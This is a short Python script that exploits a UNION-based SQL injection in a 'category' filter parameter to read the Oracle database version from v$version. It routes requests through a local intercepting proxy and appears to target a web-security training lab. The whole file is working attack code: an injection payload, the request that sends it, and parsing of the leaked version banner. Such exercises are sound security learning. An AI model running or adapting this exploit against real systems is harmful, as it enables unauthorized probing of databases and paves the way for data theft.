import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_version(url):
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner, NULL from v$version--"
    res = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    if "Oracle Database" in res.text:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res.text, 'html.parser')
        version = soup.find(text=re.compile('.*Oracle\sDatabase.*'))
        print("[+] The Oracle database version is: " + version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")
